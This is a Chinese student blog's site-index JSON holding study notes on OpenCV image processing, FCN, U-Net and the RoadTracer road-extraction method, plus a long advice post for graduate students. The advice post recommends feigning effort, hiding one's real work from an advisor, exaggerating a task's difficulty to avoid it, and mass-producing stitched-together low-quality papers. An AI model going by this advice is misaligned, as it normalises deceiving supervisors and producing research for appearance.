{"meta":{"title":"Pa1r0t","subtitle":"记录成长","description":"welcome to my bolg","author":"Pa1r0t","url":"https://pa1r0t.github.io","root":"/"},"pages":[{"title":"about","date":"2022-11-07T03:32:11.000Z","updated":"2023-05-07T11:38:25.964Z","comments":true,"path":"about/index.html","permalink":"https://pa1r0t.github.io/about/index.html","excerpt":"","text":"介绍大家好，我是Pa1r0t 在下末流二本在读，喜欢吹牛睡觉发呆"},{"title":"友情链接","date":"2022-11-08T07:12:37.000Z","updated":"2023-01-08T12:00:55.893Z","comments":true,"path":"links/index.html","permalink":"https://pa1r0t.github.io/links/index.html","excerpt":"","text":".links-content{ margin-top:1rem; } .link-navigation::after { content: \" \"; display: block; clear: both; } .card { width: 30%; font-size: 1rem; padding: 10px 20px; border-radius: 4px; transition-duration: 0.15s; margin-bottom: 1rem; display:flex; } .card:nth-child(odd) { float: left; } .card:nth-child(even) { float: right; } .card:hover { transform: scale(1.1); box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04); } .card a { border:none; } .card .ava { width: 3rem!important; height: 3rem!important; margin:0!important; margin-right: 1em!important; border-radius:4px; } .card .card-header { font-style: italic; overflow: hidden; width: 100%; } .card .card-header a { font-style: normal; color: #2bbc8a; font-weight: bold; text-decoration: none; } .card .card-header a:hover { color: #d480aa; text-decoration: none; } .card .card-header .info { font-style:normal; color:#a3a3a3; font-size:14px; min-width: 0; overflow: hidden; white-space: nowrap; } CtfStar’s blog 励志做安全研究员 越行勤's Blog 努力学习的小菜鸟"},{"title":"标签","date":"2022-11-06T05:26:24.000Z","updated":"2022-11-07T02:00:45.230Z","comments":true,"path":"tags/index.html","permalink":"https://pa1r0t.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"组会汇报1","slug":"组会汇报1","date":"2024-09-10T13:06:14.000Z","updated":"2024-09-25T15:25:59.864Z","comments":true,"path":"2024/09/10/组会汇报1/","link":"","permalink":"https://pa1r0t.github.io/2024/09/10/%E7%BB%84%E4%BC%9A%E6%B1%87%E6%8A%A51/","excerpt":"","text":"当前主流的模型聚焦与道路面的提取 TOPO是比较真实路网和计算路网上起点和终点的距离差异 SP是比较起点和终点之间最短路径的相似度 Junction主要是衡量路口间的误差程度 IoU是一种测量在特定数据集中检测相应物体准确度的一个标准 IoU是两个区域重叠的部分除以两个区域的集合部分得出的结果，通过设定的阈值，与这个IoU计算结果比较。 HSV色彩空间： 基于色调、饱和度、亮度 色调H指光颜色，区间为[0,180] 饱和度S指色彩深浅，区间为[0,255],当饱和度为0时，图像变为灰色图像 亮度V指光的明暗，当饱和度相同时，亮度值越大，图像越亮，当亮度为0时，图像为纯黑色 灰度图像RGB三通道值相同就能得到 alpha通道为图像透明度通道 边缘特征提取方法 一阶微分算子： 利用图像灰度函数的梯度来检测边缘（利用梯度来检测图像中灰度值变化剧烈的区域，这些算子通过计算像素点在水平和垂直方向上的梯度值来检测边缘，当梯度值超过某个阈值时，认为该点是边缘点）； 二阶微分算子： 相比于一阶导数，二阶导数可以提供更多的边缘信息，例如边缘的方向和边缘的强度 Canny边缘检测： 利用高斯滤波器，来平滑图像，去除噪音 计算图像中每个像素点的梯度强度和方向 sobel算子，c塔为方向 应用非极大值抑制，以消除边缘检测带来的杂散响应（保留大梯度，显示明显边缘） 应用双阈值检测潜在和真实的边缘 （过滤边界，只保留最真实的一部分） 通过抑制孤立的弱边缘最终完成检测 边界存在梯度，所以梯度自然和边界垂直 利用多阶段滤波和梯度幅值来检测边缘，并使用非极大值抑制和双阈值检测来确定最终的边缘点； 非极大值抑制(NMS技术):去除检测出来的冗余框，保留最优框(对比每个框的重叠面积) 双阈值检测: 图像阈值化：根据图像内像素点强度的分布规律设置一个阈值，根据像素点强度是否低于&#x2F;高于阈值进行处理。用于突出边缘或纹理 Ostu方法遍历所有可能的阈值，从中找到合适的阈值 二值化处理得到物体轮廓 原始图像-&gt;灰度图像-&gt;二值化图像-&gt;反二值化 物体边缘信息变得鲜明 感兴趣区域ROI（掩膜）: 从图像中选择一个图像区域，以便进一步处理img[R1：R2，L1:L2] np.ones((101,101,3))创建一个101×101的三通道图像 图像融合是在图像加法基础上增加了权重不同的系数和亮度调节：cv.addWeighted(img1，weight1,img2.weight2,light) 查找目标模板在图象中处在什么位置叫模板匹配 cv2.matchTemplate的输出是[W-w+1,H-h+1]的32位浮点型数组 单目标匹配只返回匹配度最高的结果 多目标匹配将原始图像中所有与模板相似的图像都找出来，使用相关匹配或相关系数匹配可以实现 在一张图片中同时查找多个模板叫多模板匹配？ 平滑处理（图像模糊处理），去除图像内噪声、降低细节层次信息，工具 滤波器 均值滤波器、：滤波核内像素平均值 中值滤波器 将滤波核的像素大小排序然后取中间值 高斯滤波器（使用最广泛） 分配像素权重，远离核心权重小，靠近核心权重大 双边滤波器 平滑处理中有效保护图像边界信息，自动判断滤波核处于平坦还是边缘 平坦 高斯滤波 边缘 加大权重，尽可能让像素保持不变 腐蚀与膨胀为了清除和强化图像中的细节 图像开运算 图像闭运算 梯度运算 顶帽运算 黑帽运算 腐蚀 膨胀 开运算先腐蚀后膨胀，用来去除外部细节，用作数量统计 闭运算先膨胀后腐蚀，用来去除内部细节 形态学运算 梯度运算指的是图像梯度运算，直观就是像素的变化程度: 膨胀图-腐蚀图&#x3D;图像轮廓图 边缘轮廓cv2.findContours 读数据-转成灰度图-阈值二值法-轮廓检测 Canny()方法虽然能检测出图像的边缘，但是这个边缘是不连续的，该算法根据像素的梯度变化寻找图像边缘，最终绘制精细二值边缘图像 调整双阈值来控制边缘检测的精细程度，当两个阈值都较小时，检测出较多细节；反之会忽略较多细节 轮廓近似 阈值设置越小，近似轮廓就越接近原始图像 轮廓拟合 凸包如果能找到图形最外层的端点，将这些端点连接起来，就可以围出一个包围图形的最小包围框，也叫凸包，也是最接近轮廓的多边形 霍夫变换是一种特征检测，通过算法识别图像特征，从而判断图像形状 视频处理读取摄像头，并显示视频，用opencv的VideoCapture类相关方法，此方法还支持视频文件 图像梯度（用于检测图像边缘信息）Sobel算子 以上乘法是卷积运算，右减左，上减下； cv2.addWeighted(sobelx,0.5,sobely,0.5,0) #水平梯度图融合垂直梯度图 Scharr算子比较sobel，该算子核中数值较大 laplacian算子该算子对梯度求二阶导，对噪声更加敏感 不用分别求x和y 三种算子比较 图像金字塔 高斯金字塔（向下采样，图像缩小） 高斯金字塔（向上采样图像放大） 拉普拉斯金字塔 G表示输入img，G-(u_d) 1,2即为下采样操作 随后上采用和原始图像做减法，4操作 直方图统计每个像素值在图像中出现的次数 直方图均衡化直方图中某些位置的数量特别多 、 分灰度值数量进行统计 随之计算各值的概率和累计概率、 进行函数映射 映射后的像素个数取整 自适应直方图均值化 将图像切成若干块，进行分别均值化 傅里叶变换傅里叶变换作用： 高频：变化剧烈的灰度分量，例如边界 低频：变化缓慢的灰度分量，例如一片大海 滤波： 低通滤波器：只保留低频，会使得图像模糊 高通滤波器：只保留高频，会使得图像细节增强 人所看到的世界与时间相关，随时间发生变化，用时间作为参照物来观察动态世界-&gt;时域 类似乐谱-&gt;频域 任何周期函数都可以看作不同振幅，不同相位正弦波的叠加 不同频率的正弦波成为频率分量 频域中0频率被称为直流分量，级数叠加中，仅仅影响全部波形相对数轴整体向上或向下而不改变的形状 从某条曲线中去除一些特定的频率成分，称为滤波 级数：周期连续-&gt;非周期离散 变换：非周期连续（时域）-&gt;非周期连续（频域） 用cv2.dft()进行时域变换到频域 用cv2。idft()进行频域变换到时域 得到的结果中频率为0的部分会出现在左上角，通过shift变换来实现 cv2.dft()返回的结果是双通道的（实部、虚部），通常还需要转换成图像格式才能展示（0，255） 全卷积神经网络（FCN）FCN中的主要特点是大量使用卷积、上采样和跳跃连接 传统的卷积神经网络通常在网络的最后一层使用全连接层,将原始的二维矩阵压缩 成一维矩阵,导致空间特征信息的丢失,因此,卷积层替换掉全连接层是行之有效的方法。影像的目标提取及输出应该是一个正常的特征映射,即在不考虑大小的情况下应当是二维的。 为了降低高分辨率遥感影像中细节信息的损失,采用了跳跃连接结构。对于神经网络,浅层网络有丰富的高分辨率特征映射,而深层网络有低分辨率的特征 映射,但是拥有更多抽象的语义信息。跳跃连接结构可以在各个层次之间,混合浅层的网络细节信息内容与深度的网络语义信息内容并通过特征拼接,改善提取 结果。全卷积神经网络,是在网络的最后阶段通过上采样可以恢复特征图到原始尺寸。 U-net模型是2015年由 Ronneberger 等人提出的一种改进的全卷积神经 网络,最初应用于医学图像的分割。U-net 网络结构如图 2.4 所示,包括五个分 辨率标度,由收缩路径和扩展路径组成。其中,跳跃连接结构可以恢复在收缩路 径中损失的高分辨率图像细节信息。 空洞卷积在语义分割网络中通常会使用池化操作来减小特征图的大小尺寸,起到减少参数量和增大感受野的作用。但是会出现一些不可控的问题,在池化过程中会导 致特征信息丢失,而后进行的上采样操作并不能补足丢失的特征信息,特别是对于小型目标特征,进而导致特征提取效果不佳。在这些问题的基础上,空洞卷积 提出可以很好避免这些现象。空洞卷积是针对普通卷积感受野的限制性进行了改进,在普通卷积核中利用空洞率作为一个超参数,实现感受野的指数级扩展,却不会丢失分辨率和特征覆盖范围。 空洞卷积引入了新的参数膨胀率 空洞卷积对卷积核间隔采样，间隔大小通过膨胀率来控制 多孔空间金字塔 RoadTracer文章：RoadTracer: Automatic Extraction of Road Networks from Aerial Images 顶会:CVPR2018 使用卷积神经网络(CNNs)来检测哪些像素属于一条道路（分割） ，然后利用复杂的后处理来将这些像素转化成路网，但这些分割方法具有较高的错误率，因为噪声CNN输出是难以纠正的 自动构建精确的道路网络图的新方法——道路跟踪器 即道路跟踪器使用基于CNN的决策函数引导的迭代搜索过程直接从CNN的输出导出道路网络图。每次迭代时都使用CNN决策网络判断是否将一部分路网加入到已经创建的路网中 RoadTracer的核心算法流程。首先给定一个路网的起点v0和包围盒（需要提取路网的区域），然后RoadTracer会维护一个顶点栈和一个路网。每次从栈顶取一个顶点，并在其基础上寻找下一个与其相连的顶点。如果找到下一个顶点(潜在)，则将其加入栈顶，同时更新路网；反之就将该顶点从栈顶弹出。当栈为空时，则表明该图像上的所有路网信息已经完全获取。 迭代搜索算法 下图展示了RoadTracer在路口的运行方式。首先从顶点1开始逐步往前到顶点6，此时栈也逐步增加；在路口先向上（默认设定）寻找新的顶点，并最终到顶点9；由于顶点9后再无新的顶点，因此栈又逐步减少，最后又回到顶点7；然后再向下寻找到顶点11；最终由于顶点11后无新的顶点，栈又回到了顶点7。最后如果没有新的顶点，栈会逐步被清空，从而完成路网的检测。 CNN决策网络 CNN决策网络输入层是一个在顶点上d×d大小的窗口，该窗口总共有4层，前3层是图像信息，最后一层是矢量化后的路网信息；因此能够保证决策网络能够获取当前顶点所在区域足够的的信息。 CNN决策网络的输出层包括两部分，分别是行动信息和角度信息。行动信息包括停止和运动，角度信息是运行的方法。","categories":[],"tags":[]},{"title":"AI数学基础","slug":"AI数学基础","date":"2024-07-01T14:48:01.000Z","updated":"2024-07-01T14:49:30.843Z","comments":true,"path":"2024/07/01/AI数学基础/","link":"","permalink":"https://pa1r0t.github.io/2024/07/01/AI%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/","excerpt":"","text":"","categories":[{"name":"AI","slug":"AI","permalink":"https://pa1r0t.github.io/categories/AI/"},{"name":"基础","slug":"AI/基础","permalink":"https://pa1r0t.github.io/categories/AI/%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"建议总结","slug":"建议总结","date":"2024-06-30T13:22:17.000Z","updated":"2024-07-08T05:46:12.518Z","comments":true,"path":"2024/06/30/建议总结/","link":"","permalink":"https://pa1r0t.github.io/2024/06/30/%E5%BB%BA%E8%AE%AE%E6%80%BB%E7%BB%93/","excerpt":"","text":"推荐b站导师怎么水论文？研究生哈哈 IEEE那几个顶刊如果作者不挂fellow或者senior。大概率秒拒，所以搞科研是团队作战。大佬牵头。手下出击。 耿同学讲故事 来自星星的何教授 老龙王小青椒 宇凡聊学术 做科研的大师兄 暑假规划​ 对于申博，你要进⼊⼀个能给你引荐博⼠的导师名下，这个很容易判 断，看看往届师兄的去处，如果没有读博的师兄姐，就别相信你导师的饼，你 也可以相信⾃⼰可以是是那个开天辟地的⼈；其次，对于你科研能⼒的把握， 其实，这个很好判断，如果你能进⼀个可以引荐读博的课题组，然后你能在那 个组⾥正常的活下来，其实你的能⼒也没啥问题，如果你是勉强甚⾄很难受的待着的，我不太建议你读博，可以和导师表明⾃⼰的想法，因为读博的压⼒是 远远⼤于硕⼠的，在硕⼠期间就扛不住，读博⼤概率是去活受罪；最后，对于申博，你的学历是很重要的，不仅是你的硕⼠学历，还有你的本科学历，如果 你的学历不好，就需要通过级别很⾼的论⽂来抵消，当然，如果你是双⾮的， 就不仅仅要论⽂来抵消了，需要很多很多，我个⼈现在的看法是，如果不是有 执念，花这个精⼒赌读博，不如赌进⼤⼚赚钱，因为等你博⼠毕业了，⼜要看你的第⼀学历，第⼆学历，⼜是⼀个循环 ​ 说⽩了读博，本硕期间的学历很重要，课题组的资源很重要，导师的引荐很重 要，⾃身的天赋也很重要，否则，别被画了⼤饼，还在乐呵呵的给⼈数钱，到 了，研三，发现申博也申不了太好的，⼯作也找不到好的，南柯⼀梦。更多的 可以查看章节“对于读博的看法” ​ ​ 选择导师⾸要的最好的评判标准，两个字“⼈品”，⼈品这个东⻄如 何体现，就是看⼀个导师是否尊重学⽣的想法和未来规划 ​ 与导师相处​ 如果你⼀来就放⼤招，释放了⾃⼰全部的潜能，你今天花了6个⼩时就做完了，我们⾸先不考虑你的导师过⼏天会不会让你花8个⼩时，但是你哪天⽬标 变了，亦或者谈恋爱了，你拿出4⼩时，你说你导师⽣不⽣⽓。⽽且绝⼤数的情况是，你刚去学校，你的导师会⼀步⼀步尝试你的能⼒，看看你的极限在哪 ⾥，任务会⼀天⽐⼀天重。所以你要学会示弱，该摆就摆，这是在未来三年给 ⾃⼰留退路，年轻⼈切记⼀来就精⼒⽆限，那么剩下的就是⽆限的push和 pua。年轻⼈明明就是要成⻓的，那为什么我不拿出所有的时间来学习成⻓ 呢？我们前⽂⼀⼤堆的铺垫忘了吗？你导师他也是个⼤⽜⻢，也就是说，他交 给你的任务绝⼤多数是为了完成他⾃⼰的任务，⽽不是真正站在你的⻆度为你 考虑。并且绝⼤多数交给研究⽣的任务对研究⽣未来的就业是⽆益的，你把时 间全部浪费在这些⽆益的事情之上，临近毕业你怎么和其他⼈竞争好的⼯作， 靠论⽂？hr那关都过不去，hr也不知发的论⽂是啥。 ​ 其次对于想读博的，你可能觉得，我拼命发论⽂不也挺好的吗？申博⼀般需要 的是⼀篇⾼质量的论⽂，以及未来能有引荐，⾼质量的论⽂则需要的是你要进 ⼊⼀个好的课题组，以及个⼈能⼒。如果你进⼊的不是⼀个很好的课题组，很 有可能你会和我的⼀个朋友⼀样，发了5篇普通⽂章只给导师做了嫁⾐，最后只 能在导师的帮助下顶多申请⼀个双⾮博⼠（我的建议：双⾮博⼠真读不了⼀ 点），导致最后⾃⼰读博读不了，⾃⼰java还没有学明⽩，找⼯作很费劲。你如果在挖掘⾃⼰能⼒的时候发现⾃⼰不适合科研，可以及时⽌损；如果适合 科研，慢慢释放潜能就⾏，然后发个⼀篇⾼质量⽂章就够了，如果你真的很 强，有很多idea，留到读博的时候在⽤，那时候才是你展现真功夫的时候。 ​ 不能把⾃⼰的时间全部交付给了你的导师，尤其是需要去加班、熬夜、通宵，那更是不可⾏的。 ​ ⼀定要记住，很多事，慢慢来，慢慢做，你开⼼，你导师也开⼼，认为你很负责很细⼼；如果你很快的完成，很多时候会让⼈觉得不负责任。其次对于有⼀ 个deadline的任务，除了有红头⽂件规定的deadline，千万别觉得你导师第⼀ 次和你说的时限就是那件事真正的deadline，⼈和⼈之间是没什么信任的，你 ⼀定要通过和你导师的相处，知道你在deadline多久之后完成才不会触碰你导 师的底线，在此之前，尽情的让他催，千万别愣头⻘，⼀下⼦蛮⼲就把他⼲完 了，你⼀旦让他有了⾼期待，那么等待着你的就是⽆尽的⼲不完的活，永远要表现出：我能⼒差、我不⾏、我会努⼒。 ​ 其实示弱就是你未来在职场的⽣存法则，兔⼦博鹰，永远有底牌，让⼈看不 透。示弱看起来很好，那有没有副作⽤，有，⽽且还很⼤，遇到奇葩导师，会 对你辱骂，骂你傻逼，骂你垃圾，相信很多同学也碰⻅了此类⼈，那还要不要 继续示弱呢？你要想想对于这类⼈，他的欲望能有限吗？达到什么样才能让他 满⾜呢，那就是完全奉献出你的健康和⾃尊，真⼀点都没必要。不如脸⽪厚 点，让他尽情的辱骂好了，你想过上更好的⽣活，脸⽪这个东⻄迟早有⼀天是 要丢弃掉⼀些的，说⽩了都是选择⽽已，不强迫。 ​ ⾸先对于⼀些⼒所能及的事，能帮则帮；对于耗时不是特别过分，可以不⽤加 班、熬夜就能完成的事，能做则做；对于⼀些很累很难的事，如果是公开场合 丢给你的，先不要反驳丢了他的⾯⼦，尝试着做⼀段时间，但不是让你拿命 做，⽽是尝试着找出᫾为客观的难点，或以身体为由等等，然后私底下沟通不做。对于好的导师⼀般就够⽤了，对于难搞的导师，更推荐明修栈道暗度陈仓，即明⾯上答应，明⾯上要显得很努⼒，私底下做⾃⼰的尽量保证达到⾃⼰ 的毕业要求，消磨他对你的坚持，最后⼀定在他眼中⼀定是要表现出：我很努⼒了，但是真的做不出来。 ​ 其次就是⾔语和⽣活上的，⾔语上不说拍⻢屁，好话不能少，瞅准机会就说你 这个想法真的不错，⽼师很厉害诸如此类的话，不要吝啬漂亮话；⽣活上，逢年过节私⼈订制的祝福少不了，其次就是看看能不能给⽼师送点⼟特产，不要 太贵重那就是⼈情往来，师⽣情谊，⽽且师⽣之间还很难谈到贿赂⼆字，更多 的是表达感谢的情谊！尤其是你和你导师关系激化的时候，跪舔有时候不是舔，⽽是给⾃⼰更多的可能，尤其这段感情是⽆法丢弃的时候，尽量是呈现出 弱者的姿态以交好为主。 ​ 绝⼤多数的导师都是挺好的，并且研究⽣阶段还是受社会包容、受学校保护的阶段，因此你想混个学位证就混个学位证，想考公考 编就考公考编，想去企业⼯作就去企业⼯作，不要对你的导师有过多的隐瞒， 能做就是能做，不能做就是不能做，学得慢就是慢，⼀切在进⼊学校的时候就 要慢慢透露出来，千万不要让你的导师对你有过⾼的期待。你要知道，你什么都不说，导师让你⼲啥就⼲啥，极有可能让他会觉得（⼀般 默认）你是⼀个想搞科研的好孩⼦，并且你要记住，你遇到⼀个尊重你想法的 导师，你和他不沟通，很有可能会产⽣认知偏差导致分歧； ​ 要尽量有⼀ 两个相处的还⾏的师兄姐，以后总有⼀些问题能相互交流，亦或者他们能提前 告诉⼀些事，很多时候信息差是⼀个很重要的东⻄。不过现在这个社会，⼈性 复杂，尤其是到了研究⽣这个阶段，看你⾃⼰，不喜欢也不要过于勉强，该⼲ 嘛⼲嘛！现在这个社会，⼀辈⼦能有⼀两个真正知⼼的朋友也就够了，很多事 很多⼈没必要强求的 ​ 做⼈做事莫᫾真。⾯对你的导师，很多时候，正确与否不重要，听不听话很重 要。 ⽆论你导师对你说什么事，这件事我也知道⼀听就很荒唐，很离谱，做不出 来，但是你的第⼀反应也不能是⻢上就反驳别⼈，⼀定要按着他的想法来。如果这件事不给你做，你别掺和；这件事给你做，私底下去尝试着做，⾄少得表 现出你去做过了，真做不出来，慢慢和他解释。 ​ 绝⼤多数研究⽣不能毕业，并不是他的学术能⼒不⾏，说实话，⼀篇论⽂真的 不难，研究⽣不能毕业更多是花了太多时间去处理和导师之间的关系，还没处理好，那不如完全顺着来不处理（逼着你做⽜⻢⼲项⽬是另⼀回事） ​ 精致的利⼰主义者，对付他们其实也很简单，做也继续 做，⾃⼰百度亦或者咨询ᬀ导员研究⽣和导师的关系，去明确什么该做什么不该做，然后搜集证据，通过这些证据找ᬀ导员和学院领导据理⼒争⾃⼰的⼀些 合法权益，如果这都还不⾏，那要来就⼀起来个⼤的。什么⼤的，就是当你遇 到奇葩导师，研究⽣三年你勤勤恳恳，努努⼒⼒，达到研究⽣培养计划的毕业 要求了（这是⼤前提），然后还对你提出超级⽆端过分的要求，⽐如做家务， 接送⼩孩等等，对你尽是⽆端的辱骂和pua，把这些证据搜集起来，往学院举 报，不⾏，往学校举报，再不⾏，往教育厅（部）举报，再不⾏，直接报警。 ⼀定要牢记，研究⽣是⽜⻢，但顶多是个⼩⽜⻢，如果有⼀切东⻄会让你变得 抑郁、甚⾄想轻⽣，⼀定要在你还受保护的时候，及时争取合法权益，⽽不是 选择离开这个世间，⼈⽣真的还有很多美好等着你！但是对于⽃争，有⼀点也 很重要，我们该做的都得做到位后，⼀定是⾃⼰实在想不到什么好办法后，情 绪快绷不住了后，才能去搞⽃争，舆论也才会站在我们这⼀边，否则最后的舆 论⼤都是：你是学⽣，他是导师，这些都是你应该的 ​ 总之，⾃⼰⼀定要给⾃⼰⼀个底线，其次导师给你安排的活，让你做的事，答 应给你的奖励，再相信这之前多想⼀想：我不是他亲⼉⼦，更不是私⽣⼦，那 这些到底是饼还是陷阱，⼤概率是pua ​ 尤其对于研究⽣⽽⾔更是和社会接轨的淡海⽔交界处，不仅仅要学会如何做事，更要学会如何做⼈。 ​ 示弱是为了让⾃⼰有退步的余地；交好则是我们未来对待所有⼈的态度，⽆论内⼼有多么讨厌这个⼈，明⾯上都要保持微笑，这不是虚伪，⽽是尊重每⼀个⾃然⼈，尤其是当⼀段关系⽆ 法丢弃，弱者就要有弱者的姿态，三千越甲能吞吴；沟通除了能打破双⽅的认 知偏差，更是⼀种赌，赌我们遇到的是正常的导师，能够博得尊重；还未⾛到 抑郁，未⾛到想轻⽣的那⼀步，能忍则忍，明修栈道暗度陈仓，⽃争那定要是 ⽆奈之举，毕竟⽃争的结果是两败俱伤 方向选择​ 当⼀个领域近两三年做的⼈很多的 话， 这个⽅向⼀定是个热⻔⽅向，既然是热⻔⽅向，会有现成的数据集，会有现成的基准模型，会有现成的⽅法、观点给我们借鉴，我们不需要造航⺟，再 配上我的⾃救指南⾥的裁缝思想，我只能说两个字：⽆敌。⾄于这种⽅向好不 好发论⽂，就是浑⽔摸⻥了，那么多⼈都能发论⽂，怎么就不能轮到你了，你是傻⼦还是通过关系读的研究⽣，从实招来。反倒是，做的⼈的少的⽅向，你 就要好好考虑能不好发论⽂了，凡事都要问问：凭什么轮到你来做第⼀个吃螃 蟹的⼈，你真的有那个能⼒和勇⽓吗？ ​ 搞科研的⽅向选择其实也很简单，思路和⽔论⽂的⽅向选择相反就⾏了，也就是你挑做的⼈少的⽅向就⾏了，如果只是硕⼠，⼀定也不要挑做的最少的⼈， 可以权衡下，挑个中间档的，给⾃⼰留点后路。 为什么要这样做呢？⽔论⽂可以说是浑⽔摸⻥，⽽你搞科研就要做领头⽺，做第⼀个吃螃蟹的⼈才⾏了。尤其是现在的申博，你想申⼀个双⾮博，⼀区都只是⻅⾯礼，顶刊顶会才是打开这条道路的钥匙。⽽你当选择了这条路，向往⽔ 论⽂的⽅向变，就很难变了， 所以对于读博，我⼀直觉得慎重。 但是，对于想搞科研，想读博的，最好的出路还是继承优秀导师的⽅向，有导师的亲历指导，否则你想靠⾃⼰的能⼒在2年内开天辟地的发出顶刊顶会，只能说难如登天，这两种横竖都是⽜⻢，既然读博了，也要做好当⽜⻢的准备 白马非马相信很多研究⽣刚进学校，听的最多的⼀句话就是：这个好发论⽂，这个对你 好。都是好，这两个好有什么区别呢？这个好发论⽂，⼤多数⼈刚进学校，可能就会觉得这个好发论⽂，容易毕业。 实则这个好发论⽂指的是，这个好发优秀的论⽂。如果是“这个好发优秀的论 ⽂”，我说成“这个好发论⽂”有问题吗？⼀点问题都没有。但是，却和你理解的 “这个好发论⽂，容易毕业”却是天壤之别，好发优秀的论⽂，可能会花你两 年，甚⾄三年的时间也发不出来，因为真正优秀的论⽂绝不是两三年就能搞出 来的，即使好发优秀的论⽂，时间也很漫⻓，再加上你什么也不会； 公共数据集和私有数据集公共数据集，字⾯意思理解就⾏，说⽩了就是公开的数据集，⼤家都能⽤，随 便⽤，如果可以的话⼀定要选择有公共数据集的⽅向，因为道理很简单，公开 数据早就已经被⽤烂了，各种处理⽅法啥的，说⽩了，你拿来不⽤做任何处理 就能⻢上⽤。 私有数据集，就是这个数据集从零到⼀都由⾃⼰构造，具体怎么构造，说⽩了就是收集、清洗、处理等等⾮常多的步骤，如果你只是为了⽔⼀篇论⽂毕业， 不推荐。如果你是想搞出什么⼤新闻，亦或者想发好的论⽂，发好多⽔⽂，这 是⼀个不错的做法，但真的也没必要，纯粹的浪费时间，因为⽬前学术圈对只 做数据集的认可度不⾼，主要是耗时耗⼒，没有裁缝⼀篇论⽂的速度快。 ⼀般⼀个⽅向有公开数据集，百度⼀下就能百度到。实则还想确认，可以找⼀两篇这个⽅向的综述，⼀般综述⾥⾯都会提及这个⽅向有什么公开数据集 公共数据集和私有数据集主要的区分就是有没有在互联⽹上公开，公开的数据集必然会有很多⼈图⽅便直接使⽤，在这样的数据集上进⾏试验，会省时省 ⼒，当想做出过⾼的成就就得另辟蹊径；私有数据集，什么都是⾃⼰说了算，容易出⾼的成就，但是期间需要的花费就不得⽽知了。 继承因为未来我们使⽤的学术裁缝的做法，⼀定要牵扯到⼀个基准模型，如果能继 承师兄姐的⾐钵，你⾄少能少掉半年的功夫，在此期间，你遇到什么问题也有 个⼈能帮你照应下。在科研学术上，⼀个坑放给⾃⼰踩，真不知道要踩多久，有你师兄姐的帮助， ⾄少在达到他那个⾼度之前，你基本都是平步⻘云，⽽这对你来说就⾜够了。 继承的好处不⽤我多少，多说也说不出来啥，说⽩了，就是路他⼈给你铺平 了，甚⾄直到缝模块写论⽂之前都能有⼀个⼈快速的回答你的⼀些疑难杂症， 不⾄于这⾥卡⼀下，那⾥卡⼀下，让⼈很难受。那到底怎么继承呢？这个就是你⾃⼰平常多留⼼观察，这个师兄怎么样，那个 师姐怎么样，然后私底下可以问问他们，得靠⾃⼰最后判断。⼀般这个师兄姐 能让你继承，你能明确的感觉到可以继承他的，如果你感觉到怀疑，那不⽤想 了，就别继承了。如果平常打扰的多了，别忘了请你继承的师兄姐吃吃饭，喝 喝奶茶啥的。 继承这个东⻄其实很简单，就是继承某⼀位师兄姐的⾐钵，但是这个东⻄勉强 不得。如果没有继承其实也没啥 什么是造航母蜜蜂识别，假设你有10000只蜜蜂然后⾃⼰给他们编个号，识别 出特定编号的蜜蜂。 ⾸先不考虑这个蜜蜂识别真的能不能做出来，我们可以考虑下，即使它做的出 来，我们应该怎么做： ⾸先你得去搜集10000只蜜蜂，然后得清洗数据，也就是保证蜜蜂的完整率，不能说⼀⼤堆的蜜蜂缺胳膊短腿的； 然后你得标注数据，也就是给蜜蜂们标个号； 然后你得去找模型、找⽅法来识别蜜蜂们，期间你⽆法确定那个⽅法有⽤， 就在不断地在这个相似领域⾥找呀找，这是最费时间的过程。假设你不是造 航⺟，数据不仅不需要你造，你随便找个开源的顶刊顶会，复现他们的代码就⾏了； 最后你找了模型，还得对模型进⾏⼤⼑阔斧的改造，适合你的蜜蜂数据，对结果的评价种种都需要你⼀个⼈去尝试； 等你写论⽂的时候，⼜没有对⽐模型，⼜没有综述可以借鉴去写相关⼯作； 等你投稿的时候，⼜不知道投到那个期刊合适 …… 等你临近毕业了，发现论⽂还没写好 如果你被安排了造航⺟，恭喜你，你要⽐别⼈早点学会⼀项技能：学会拒绝。 当然，你不要直接愣头⻘似的去你导师办公室，然后和他说，这是航⺟，我不 造，我拒绝，你这不是去拒绝，是打你导师的脸，做⼈做事得要谋略。 ⾸先，当你意识到你的⽅向是开天辟地，从未有⼈做过或者很少有⼈做过的的新⽅向后，⾸先你要去明确的找出这个⽅向的不可⾏性，不要⽤嘴巴说，要⾃ ⼰去搜集资料证明这个东⻄很难，再想办法把这个很难再夸⼤成不可能，并且 在找⽅向不可⾏性的过程中，去找⼀个新的合适的⽅向。即发现问题（⽅向不可⾏），并给出⼀个⽅案解决问题（新的⽅向可能还不错）。 整理好所有的东⻄后，私底下去找你导师，记住是私底下找你的导师，和他 敞开了聊。 造航⺟这个东⻄，不是特别想读博，不是下定决⼼搞科研，只想混个毕业，真 碰不了⼀点，多少个前⻋之鉴，否则三年你将会⾮常痛苦，⽽且最后还很容易 ⾛向学术不端。 造航⺟即让你开天辟地，开天辟地就是从零到⼀的尝试，⾸先不论能不能尝试 出来，就是这种不断的尝试就是极其耗费精⼒和时间的，硕⼠不过短短3年，能 有⼏个⼈可以⼀个⼈去开天辟地的，真把它做出来，即使拼了⽼命做出来了， 对硕⼠⽽⾔⼜有何意义呢？ 相关知识1.⼤多数理论的知识只要浅尝即⽌，也就是你得需要知道有这个东⻄，这个东⻄⼤概是什么，能做什么即可，内部的⼀切细节不要纠结，看不懂就跳过， ⽔论⽂不需要你对理论的细节有过深的把握； 对于需要实践、动⼿技能知识，则⼜需要分情况讨论： ​ 1.越基础的技能（例如编程中最基础的技能Python，胶⽔技能），则越需 要扎实； ​ 2.形⽽上、⾼⼤上的技能，往往不需要精通（例如编程中的框架技能 Pytorch，模块技能），也是浅尝即⽌即可。 为什么要如此学习呢，理论知识浅尝᫿⽌，胶⽔技能刨根问底，模块技能浅尝即⽌？什么⼜是胶⽔技能和模块技能？未来学术裁缝那些章节会做出详细的说明，在这⾥先做个⽣动形象的⽐喻： ⽔论⽂就相当于我们建房⼦⼀样，学理论知识就相当于打地基，但是对于学术裁缝⽽⾔，我们不会构造⾃⼰的地基，我们将会挪⽤他⼈的地基 （Baseline），之后我们将在这个地基上⼤⼑阔斧的改造，所以对于这个地基，我们只要能看懂即可，⽽不是通过学习扎实的理论知识构建出⼀个地 基； 